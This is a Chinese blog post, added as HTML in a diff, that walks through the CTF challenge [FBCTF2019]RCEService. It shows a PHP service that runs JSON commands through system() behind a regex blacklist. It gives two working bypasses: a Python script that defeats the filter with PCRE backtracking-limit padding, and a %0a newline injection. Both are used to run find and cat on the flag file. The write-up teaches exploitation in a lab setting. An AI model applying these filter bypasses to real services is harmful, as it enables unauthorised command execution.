@@ -1,0 +1,730 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [FBCTF2019]RCEService |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="题目界面如上 它说需要我们传入一个json格式的命令 我们传入 &#123;&quot;cmd&quot;:&quot;ls&quot;&#125; 回显出来了index.php 但当我们传入 &#123;&quot;cmd&quot;:&quot;ls &#x2F;&quot;&#125; 发现&#x2F;被过滤了 经过多次尝试，发现好多符号都被过滤了 没办法了，看题解 题解说这题是有源码的…我没找">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[FBCTF2019]RCEService">
+<meta property="og:url" content="http://example.com/2025/03/30/[FBCTF2019]RCEService/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="题目界面如上 它说需要我们传入一个json格式的命令 我们传入 &#123;&quot;cmd&quot;:&quot;ls&quot;&#125; 回显出来了index.php 但当我们传入 &#123;&quot;cmd&quot;:&quot;ls &#x2F;&quot;&#125; 发现&#x2F;被过滤了 经过多次尝试，发现好多符号都被过滤了 没办法了，看题解 题解说这题是有源码的…我没找">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/20250330200804428.png">
+<meta property="og:image" content="http://example.com/images/20250330204728337.png">
+<meta property="og:image" content="http://example.com/images/20250330205045584.png">
+<meta property="og:image" content="http://example.com/images/20250330205539363.png">
+<meta property="article:published_time" content="2025-03-30T12:05:21.000Z">
+<meta property="article:modified_time" content="2025-04-08T15:40:34.226Z">
+<meta property="article:author" content="fuboy">
+<meta property="article:tag" content="PCRE回溯绕过">
+<meta property="article:tag" content="php特性">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/20250330200804428.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="[FBCTF2019]RCEService">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[FBCTF2019]RCEService</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%E4%BB%A3%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">解释代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-PCRE%E5%9B%9E%E6%BA%AF%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">解法一: PCRE回溯机制绕过正则表达式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-0a-%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">解法二: %0a 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E8%A7%A3"><span class="toc-number">3.1.</span> <span class="toc-text">讲解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E8%AE%B0%E4%B8%BA%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">简记为：</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
+  <div class="sidebar-author-name">fuboy</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">89</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">66</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[FBCTF2019]RCEService" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/03/30/%5BFBCTF2019%5DRCEService/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-03-30T12:05:21.000Z" itemprop="datePublished">2025-03-30</time>
+    <time style="display: none;" id="post-update-time">2025-04-08</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>  <img src="/../images/20250330200804428.png" alt="image-20250330200804428"></p>
+<p>题目界面如上</p>
+<p>它说需要我们传入一个json格式的命令</p>
+<p>我们传入</p>
+<p><code>&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</code></p>
+<p>回显出来了index.php</p>
+<p>但当我们传入</p>
+<p><code>&#123;&quot;cmd&quot;:&quot;ls /&quot;&#125;</code></p>
+<p>发现&#x2F;被过滤了</p>
+<p>经过多次尝试，发现好多符号都被过滤了</p>
+<p>没办法了，看题解</p>
+<p>题解说这题是有源码的…我没找到…题目的问题</p>
+<p>题目源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&#x27;PATH=/home/rceservice/jail&#x27;); //putenv 函数用于设置环境变量的值</span><br><span class="line">if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">  $json = $_REQUEST[&#x27;cmd&#x27;];</span><br><span class="line">  </span><br><span class="line">  if (!is_string($json)) &#123;</span><br><span class="line">    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br><span class="line">  &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;, $json)) &#123;</span><br><span class="line">    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;;</span><br><span class="line">    $cmd = json_decode($json, true)[&#x27;cmd&#x27;];</span><br><span class="line">    if ($cmd !== NULL) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &#x27;Invalid input&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="解释代码"><a href="#解释代码" class="headerlink" title="解释代码"></a>解释代码</h2><p><code>$cmd = json_decode($json, true)[&#39;cmd&#39;];</code><br><strong>json_decode(): 这个函数用于将JSON格式的字符串解码为PHP变量,参数 $json 是要被解码的 JSON 字符串,格式类似 {“cmd”: “ls”}</strong></p>
+<p><strong>json_decode第二个参数被设置为true,意味着json_decode函数将返回一个关联数组(array)而不是一个对象(object),把json_decode函数返回的关联数组中的’cmd’键对应的值赋值给变量$command</strong></p>
+<p><strong>正则：^.<em>(捕获组).</em>$</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">. 表示匹配任意单个字符(除了换行符) </span><br><span class="line"></span><br><span class="line">*是量词，表示前面的元素可以出现0次或多次。</span><br><span class="line"></span><br><span class="line">.* 表示匹配任意数量的任意字符(默认不会匹配换行符,需要修饰符才会匹配)</span><br><span class="line"></span><br><span class="line">加上^ 变成 ^.*  表示从字符串的开始位置匹配任意数量的任意字符 </span><br><span class="line"></span><br><span class="line">后面的  .*$  表示从当前位置匹配任意数量的任意字符，直到行尾</span><br><span class="line"></span><br><span class="line">括号表示捕获组,可以在匹配过程中捕获一部分匹配的内容，并且可以在后续处理中引用这些被捕获的部分</span><br><span class="line"></span><br><span class="line">注意到正则匹配中  [\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+  </span><br><span class="line">\x00-\x1F  表示从 ASCII 码 0 到 31 的字符(控制字符),A-Z0-9 就是大写字母和数字,这里没有用修饰符i 没有过滤小写字母,后面的+表示可以匹配1次或多次</span><br></pre></td></tr></table></figure>
+
+<h2 id="解法一-PCRE回溯机制绕过正则表达式"><a href="#解法一-PCRE回溯机制绕过正则表达式" class="headerlink" title="解法一: PCRE回溯机制绕过正则表达式"></a>解法一: PCRE回溯机制绕过正则表达式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">payload = &#x27;&#123;&quot;cmd&quot;:&quot;ls /&quot;, &quot;abc&quot;:&quot;&#x27;+&#x27;a&#x27;*1000000+&#x27;&quot;&#125;&#x27;</span><br><span class="line">res = requests.post(&quot;http://b82bac10-0860-4134-8b18-d06ff9e5a5ce.node5.buuoj.cn:81/&quot;,data = &#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>这题其实用post传cmd也是可以的</p>
+<p>根目录下没找到flag</p>
+<p>我们用find找一下</p>
+<p><code>payload = &#39;&#123;&quot;cmd&quot;:&quot;find / -name flag*&quot;, &quot;abc&quot;:&quot;&#39;+&#39;a&#39;*1000000+&#39;&quot;&#125;&#39;</code></p>
+<p>发现还是没有</p>
+<p>按道理来说不应该，我们试着find index.php，这个文件肯定是有的，如果还是没有回显，那就是有问题了</p>
+<p><img src="/../images/20250330204728337.png" alt="image-20250330204728337"></p>
+<p>发现还是没有回显</p>
+<p><strong>那么应该是没有成功执行find 命令</strong>(题解说的)</p>
+<p>最可疑的就是</p>
+<p><code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这行 PHP 代码的作用是设置环境变量 PATH 的值为 /home/rceservice/jail</span><br><span class="line">意味着我们无法直接去调用find  cat等命令,因为这些命令实际上是存放在特定目录中封装好的程序,PATH环境变量就是存放这些特定目录的路径方便我们去直接调用这些命令,所以此处部分命令需要使用其存放的绝对路径去调用</span><br></pre></td></tr></table></figure>
+
+<p>find命令在我们自己的系统里是在**&#x2F;bin&#x2F;** 和 <strong>&#x2F;usr&#x2F;bin&#x2F;</strong> 目录下都存在 这里只有&#x2F;usr&#x2F;bin&#x2F;find 路径可以使用</p>
+<p>所以<code>payload = &#39;&#123;&quot;cmd&quot;:&quot;/usr/bin/find / -name flag&quot;, &quot;abc&quot;:&quot;&#39;+&#39;a&#39;*1000000+&#39;&quot;&#125;</code></p>
+<p><img src="/../images/20250330205045584.png" alt="image-20250330205045584"></p>
+<p>成功回显出了<code>/home/rceservice/flag</code>路径</p>
+<p>那现在就是要读取flag了，但cat命令也不能直接使用，cat在我们的系统里和find命令一样在 &#x2F;bin&#x2F; 和 &#x2F;usr&#x2F;bin&#x2F; 目录下都存在</p>
+<p>但这里只能用&#x2F;bin&#x2F;cat</p>
+<p><code>payload = &#39;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;, &quot;abc&quot;:&quot;&#39;+&#39;a&#39;*1000000+&#39;&quot;&#125;&#39;</code></p>
+<p>读到了flag</p>
+<h2 id="解法二-0a-绕过"><a href="#解法二-0a-绕过" class="headerlink" title="解法二: %0a 绕过"></a>解法二: %0a 绕过</h2><h3 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%0a 构造的位置问题</span><br><span class="line"></span><br><span class="line">正则表达式是 ^...$ 格式  如果没有修饰符m 那么^只会匹配第一行的内容,可以利用%0a换行符绕过</span><br><span class="line">而且这里还用了.* 贪婪匹配  也没有修饰符s  所以 .* 也不会匹配换行符%0a</span><br><span class="line">那么只需传入换行符%0a,那么就可以绕过 .* 从而绕过正则匹配</span><br><span class="line">但是这里正则匹配表达式中 \x00-\x1F 过滤了ascii码 0-31 的控制字符,包含了换行符,因此%0a会被匹配</span><br><span class="line">也就是说如果传入的命令是</span><br><span class="line">&#123;%0a&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;&#125; </span><br><span class="line">此时 .* 匹配了最开始的左括号&#123;  因为遇到%0a就不匹配了,然后正则表达式括号中的\x00-\x1F 匹配了换行符%0a  而后面的+表示可以匹配1次或多次,因此在%0a后面再多添加几个%0a也没用   最后的.* 匹配了&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;&#125;  从而匹配成功,如下图所示</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/20250330205539363.png" alt="image-20250330205539363"></p>
+<p><strong>如果在字符串最末尾的 } 之前加上一个%0a</strong>  <strong>变成</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="number">0</span>a<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;/bin/cat /home/rceservice/flag&quot;</span>%<span class="number">0</span>a&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>此时.* 匹配 {   而\x00-\x1F 匹配了第一个%0a 但是最后的 .* 不能匹配换行符,因此也匹配不到换行后的 }  所以不能匹配到完整字符串,返回值为空,完成正则绕过</strong></p>
+<h3 id="简记为："><a href="#简记为：" class="headerlink" title="简记为："></a>简记为：</h3><p><strong>^xxx$这个格式的绕过一般采用%0a</strong></p>
+<p>preg_match()函数只能匹配第一行数据，可以使用换行符%0a绕过</p>
+<p><code>pyload: ?cmd=&#123;%0A&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0A&#125;</code> </p>
+<p>得到flag</p>
+<p>当然，前后多加几个%0A也没事</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/PCRE%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87/" rel="tag">PCRE回溯绕过</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/php%E7%89%B9%E6%80%A7/" rel="tag">php特性</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[SUCTF 2019]Pythonginx" class="lazyload">
+        
+        <a href="/2025/03/31/%5BSUCTF%202019%5DPythonginx/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [SUCTF 2019]Pythonginx
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="../images/17369576223624.jpg" data-sizes="auto" alt="[GYCTF2020]FlaskApp" class="lazyload">
+        
+      
+      <a href="/2025/03/30/%5BGYCTF2020%5DFlaskApp/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [GYCTF2020]FlaskApp
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      fuboy
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        120.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        08:20
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%E4%BB%A3%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">解释代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80-PCRE%E5%9B%9E%E6%BA%AF%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">解法一: PCRE回溯机制绕过正则表达式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-0a-%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">解法二: %0a 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E8%A7%A3"><span class="toc-number">3.1.</span> <span class="toc-text">讲解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E8%AE%B0%E4%B8%BA%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">简记为：</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
+  <div class="sidebar-author-name">fuboy</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">89</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">66</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
